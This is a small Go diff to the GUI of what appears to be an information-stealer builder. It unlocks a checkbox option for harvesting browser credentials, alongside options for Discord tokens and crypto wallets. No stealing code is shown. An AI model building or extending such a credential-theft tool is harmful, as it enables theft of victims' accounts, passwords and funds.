@@ -61,7 +61,7 @@ func main() {
 	// Create checklist containers for each type of checkbox-type
 	getDiscordTokensCheck := widget.NewCheck("Discord Tokens", func(bool) {})
 	getWalletCredentialsCheck := widget.NewCheck("Crypto Wallets", func(bool) {})
-	getBrowserCredentialsCheck := widget.NewCheck("Browser Credentials (Pro)", func(bool) {})
+	getBrowserCredentialsCheck := widget.NewCheck("Browser Credentials", func(bool) {})
 
 	systemContainer := container.NewVBox(
 		getDiscordTokensCheck,
